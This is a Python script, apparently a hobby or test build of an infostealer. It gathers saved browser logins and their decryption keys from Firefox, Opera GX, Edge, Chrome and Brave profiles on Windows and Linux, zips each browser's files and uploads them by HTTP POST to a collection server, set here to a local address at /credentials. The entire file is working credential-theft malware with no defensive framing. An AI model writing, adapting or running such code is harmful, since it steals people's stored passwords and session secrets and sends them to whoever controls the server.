import io
import os
import sys
#import pwd
import requests
import platform
from zipfile import ZipFile

LINUX_OS = 0
WINDOWS_OS = 1

def check_os() -> int:
    """
    Checks the operation system.

    Returns:
    - Returns WINDOWS_OS if the operation system is Windows.
    - Returns LINUX_OS if the operation systems is Linux.
    """
    return LINUX_OS if platform.system() == "Linux" else WINDOWS_OS

def send_information(database, json, login_file_name, key_file_name, zip_filename) -> int:
    """
    Send the information gathered to the webhook server.

    Parameters:
    - database: The data to be sent to the server.
    - json: The JSON data to be sent to the server.
    - login_file_name: The name of the login file.
    - key_file_name: The name of the key file.

    Returns:
    - 0: Success
    - 1: Some error occurred (HTTP status code other than 200)
    - -1: Request exception
    """
    try:
        zip_buffer = io.BytesIO()

        with ZipFile(zip_buffer, 'w') as zip_file:
            file_content = database.read()
            zip_file.writestr(key_file_name, file_content)

            file_content = json.read()
            zip_file.writestr(login_file_name, file_content)

        zip_buffer.seek(0)

        files = {
            'file': (zip_filename, zip_buffer, 'application/zip')
        }

        response = requests.post(SERVER, files=files)

        if response.status_code == 200:
            print(f"[SUCCESS] File '{login_file_name}' and '{key_file_name}' in '{zip_filename}' were sent with success.")
            return 0
        else:
            return 1

    except requests.exceptions.RequestException as e:
        print(f"Error sending information: {e}")
        return -1
    
def file_gathering(pass_file_path, key_file_path, login_file_name, key_file_name, browser) -> int:
    try:
        zip_filename = browser + ".zip"
        with open(pass_file_path, "rb") as pass_file, open(key_file_path, "rb") as key_file:
            send_information(key_file, pass_file, login_file_name, key_file_name, zip_filename)
        return 0
    except Exception as e:
        print(f"Error in file_gathering: {e}")
        return 1

def gather_firefox_files() -> None:
    if check_os() == LINUX_OS:
        common_path = f"/home/{USERPROFILE}/snap/firefox/common/.mozilla/firefox"
    else: 
        common_path = os.path.join(USERPROFILE, "appdata/roaming/mozilla/firefox/profiles")

    login_file_name = "logins.json"
    key_file_name = "key4.db"

    try:
        directory_files = os.listdir(common_path)
        for profiles in directory_files:
            login_file_path = os.path.join(common_path, profiles, login_file_name)
            key_file_path = os.path.join(common_path, profiles, key_file_name)

            if os.path.exists(login_file_path):
                file_gathering(login_file_path, key_file_path, login_file_name, key_file_name, "firefox")
    except Exception as e:
        print(f"Error in gather_firefox_files: {e}")

def gather_opera_files() -> None:
    common_path = os.path.join(USERPROFILE, "appdata/roaming/Opera Software/Opera GX Stable")

    login_file_name = "Login Data"
    key_file_name = "Local State"

    try:
     
        login_file_path = os.path.join(common_path, login_file_name)
        key_file_path = os.path.join(common_path, key_file_name)

        if os.path.exists(login_file_path):
            file_gathering(login_file_path, key_file_path, login_file_name, key_file_name, "opera")
    except Exception as e:
        print(f"Error in gather_opera_files: {e}")

def gather_chromium_files(browser: str, browser_name: str) -> None:
    if check_os() == LINUX_OS:
        common_path = f"/home/{USERPROFILE}/.config/{browser}"
    else: 
        common_path = f"{USERPROFILE}/appdata/local/{browser}/user data"
    
    login_file_name = "Login Data"
    key_file_name = "Local State"

    try:
        directory_files = os.listdir(common_path)
        for file_name in directory_files:
            login_file_path = os.path.join(common_path, file_name, login_file_name)

            if check_os() == LINUX_OS:
                key_file_path = os.path.join(common_path, key_file_name)
            else:
                key_file_path = os.path.join(common_path, key_file_name)
            
            if os.path.exists(login_file_path):
                file_gathering(login_file_path, key_file_path, login_file_name, key_file_name, browser_name)
    except Exception as e:
        print(f"Error in gather_chromium_files: {e}")

def main() -> int:
    # print(f"OS Type: {check_os()}")
    
    # Firefox
    print(f"[INFO] Firefox Gathering...")
    gather_firefox_files()

    # OperaGX
    if check_os() == WINDOWS_OS:
        print(f"\n[INFO] OperaGX Gathering...")
        gather_opera_files()

    # Edge
    print(f"\n[INFO] Edge Gathering...")
    if check_os() == LINUX_OS:
        gather_chromium_files("microsoft-edge", "edge")
    else:
        gather_chromium_files("Microsoft/Edge", "edge")

    # Google Chrome
    print(f"\n[INFO] Google Chrome Gathering...")
    if check_os() == LINUX_OS:
        gather_chromium_files("google-chrome", "chrome")
    else:
        gather_chromium_files("Google/Chrome", "chrome")

    # Brave
    print(f"\n[INFO] Brave Gathering...")
    gather_chromium_files("BraveSoftware/Brave-Browser", "brave")

    return 0

if __name__ == '__main__':
    #if check_os() == LINUX_OS:
        #USERPROFILE = pwd.getpwuid(os.getuid())[0]
    #else:
    USERPROFILE = os.environ['USERPROFILE']

    SERVER = "http://127.0.0.1:5000/credentials"
    sys.exit(main())
